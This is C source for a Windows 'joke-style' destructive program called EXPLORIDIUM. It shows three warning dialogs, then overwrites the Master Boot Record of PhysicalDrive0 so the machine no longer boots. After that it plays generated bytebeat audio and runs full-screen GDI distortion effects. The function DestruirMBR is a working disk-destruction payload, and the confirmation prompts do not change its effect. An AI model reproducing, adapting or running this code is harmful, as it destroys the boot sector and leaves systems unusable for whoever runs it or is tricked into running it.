#include <windows.h>
#include <mmsystem.h>
#include <math.h>

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "gdi32.lib")

unsigned int t = 0;
bool activo = true;
const int FASE_MUSTRAS = 330750; // 30 secs

void DestruirMBR() {
    DWORD wb;
    char mbrData[512] = { 0 }; 
    mbrData[510] = (char)0x55;
    mbrData[511] = (char)0xAA;
    HANDLE hDrive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    if (hDrive != INVALID_HANDLE_VALUE) {
        WriteFile(hDrive, mbrData, 512, &wb, NULL);
        CloseHandle(hDrive);
    }
}

// Audio engine thread function
DWORD WINAPI AudioEngine(LPVOID lpParam) {
    HWAVEOUT hWaveOut;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

    char buffer[11025];
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };

    // audio generation split into 10 phases of 30 seconds each
    while (activo && t < (FASE_MUSTRAS * 10)) {
        for (int i = 0; i < sizeof(buffer); i++, t++) {
            if (t < FASE_MUSTRAS) // Fase 01
                buffer[i] = (char)(t >> (((t % 2 ? t % ((t >> 13) % 8 >= 2 ? ((t >> 13) % 8 >= 4 ? 41 : 51) : 61) : t % 34))) | (~t >> 4));
            else if (t < FASE_MUSTRAS * 2) { // Fase 02
                int nse[] = { 48,50,52,53,55,57,59 };
                buffer[i] = (char)((nse[(t / 20) % 7] - 48) * 28 & t / 90 & -t / 91);
            }
            else if (t < FASE_MUSTRAS * 3) // Fase 03
                buffer[i] = (char)(t * (t ^ t + (t >> 15 | 1) ^ (t - 1280 ^ t) >> 10));
            else if (t < FASE_MUSTRAS * 4) // Fase 04
                buffer[i] = (char)(t * (((t >> 9) ^ ((t >> 9) - 1) ^ 1) % 13) * t);
            else if (t < FASE_MUSTRAS * 5) // Fase 05
                buffer[i] = (char)(15 - t % (t & 16384 ? 26 : 29) & t >> 4 | t << 1 & -t >> 4);
            else if (t < FASE_MUSTRAS * 6) // Fase 06
                buffer[i] = (char)(t * ((t & 4096 ? t % 65536 < 59392 ? 7 : t >> 6 : 16) + (1 & t >> 14)) >> (3 & -t >> (t & 2048 ? 2 : 10)));
            else if (t < FASE_MUSTRAS * 7) // Fase 07
                buffer[i] = (char)(((t & 32767) >> 13 == 2 | (t & 65535) >> 12 == 9 ? (t ^ -(t / 8 & t >> 5) * (t / 8 & 127)) & (-(t >> 5) & 255) * ((t & 65535) >> 12 == 9 ? 2 : 1) : (t & 8191) % ((t >> 5 & 255 ^ 240) == 0 ? 1 : t >> 5 & 255 ^ 240)) / 4 * 3 + (t * 4 / (4 + (t >> 15 & 3)) & 128) * (-t >> 11 & 2) * ((t & 32767) >> 13 != 2) / 3);
            else if (t < FASE_MUSTRAS * 8) // Fase 08
                buffer[i] = (char)((((t * (t & 16384 ? 7 : 5) * (3 - (3 & t >> 9) + (3 & t >> (-t >> 20 & 1 ? 8 : 11))) >> (3 & -t >> (t & (-t & 57344 ? 4096 : 6144) ? 2 : 16)) | (-t & 24576 ? (3 * t >> 5) % 192 : (t >> 4) % 192) | (t >> 20 & 1 ? t >> 4 : t >> (-t >> 18 & 1) + 2)) & 255) >> 1));
            else if (t < FASE_MUSTRAS * 9) { // Fase 09
                int a = (int)(30 * t * pow(1.059, (t >> 13) % 12));
                buffer[i] = (char)((a % 255 + a % 128 + a % 64 + a % 32) / 3);
            }
            else // Fase 10
                buffer[i] = (char)((t * (t >> 8 | t >> 9) & 46 & t >> 8) ^ (t & t >> 13 | t >> 6));
        }
        waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
        while (!(header.dwFlags & WHDR_DONE) && activo) Sleep(1);
        waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    }
    activo = false;
    waveOutClose(hWaveOut);
    return 0;
}

int main() {
// TRIPLE CONFIRMATION SYSTEM
    if (MessageBoxA(NULL, 
        "WARNING: The software you are about to execute is malicous and highly destructive.\n\nDo you want to proceed with the execution?", 
        "EXPLORIDIUM - Safety Warning 1/3", 
        MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) != IDYES) return 0;

    if (MessageBoxA(NULL, 
        "EXTREME DANGER: The Master Boot Record (MBR) will be overwritten.\nYour computer will NO LONGER BOOT after the next restart.\n\nAre you absolutely sure?", 
        "EXPLORIDIUM - Critical Error 2/3", 
        MB_YESNO | MB_ICONERROR | MB_DEFBUTTON2) != IDYES) return 0;

    if (MessageBoxA(NULL, 
        "FINAL WARNING: This is your last chance to cancel.\nExecution is irreversible.\n\nDo you want to destroy this machine?", 
        "EXPLORIDIUM - System Termination 3/3", 
        MB_YESNO | MB_ICONSTOP | MB_DEFBUTTON2) != IDYES) return 0;

    DestruirMBR();
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AudioEngine, NULL, 0, NULL);

    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    int tx = 0, ty = 0, dx = 20, dy = 20;

    // Infinite visual destruction loop
    while (activo) {
        // Get the device context for the entire screen
        HDC hdc = GetDC(NULL); 

        // FORCE REFRESH SCREEN
        InvalidateRect(NULL, NULL, FALSE);

        if (t < FASE_MUSTRAS * 3) {
            // gelatine effect
            for (int i = 0; i < sh; i += 5) {
                int offset = sin(t / 8.0 + i / 15.0) * 20;
                BitBlt(hdc, offset, i, sw, 5, hdc, 0, i, SRCCOPY);
            }
        }
        else if (t < FASE_MUSTRAS * 6) {
            // Pyscodelic Zoom Effect
            StretchBlt(hdc, 15, 15, sw - 30, sh - 30, hdc, 0, 0, sw, sh, SRCCOPY);
            if (t % 1500 == 0) BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, DSTINVERT);
        }
        else if (t < FASE_MUSTRAS * 9) {
            // Paralelogram Distortion
            POINT v[3];
            v[0].x = rand() % 60; v[0].y = rand() % 60;
            v[1].x = sw - rand() % 60; v[1].y = rand() % 60;
            v[2].x = rand() % 60; v[2].y = sh - rand() % 60;
            PlgBlt(hdc, v, hdc, 0, 0, sw, sh, 0, 0, 0);
            
            // Random color inversion
            if (rand() % 10 == 0) BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, NOTSRCCOPY);
        }
        else {
            // Bouncing Text Effect
            SetBkMode(hdc, TRANSPARENT);
            SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
            HFONT hFont = CreateFontA(100, 0, 0, 0, FW_EXTRABOLD, 0, 0, 0, 0, 0, 0, 0, 0, "Impact");
            SelectObject(hdc, hFont);
            
            TextOutA(hdc, tx, ty, "EXPLORIDIUM", 11);
            tx += dx; ty += dy;
            if (tx < 0 || tx > sw - 300) dx = -dx;
            if (ty < 0 || ty > sh - 100) dy = -dy;

            BitBlt(hdc, rand() % 30 - 15, rand() % 30 - 15, sw, sh, hdc, 0, 0, SRCINVERT);
            DeleteObject(hFont);
        }

        // DC Liberation
        ReleaseDC(NULL, hdc);

        // Refresh rate control
        Sleep(2); 
    }

    return 0;
}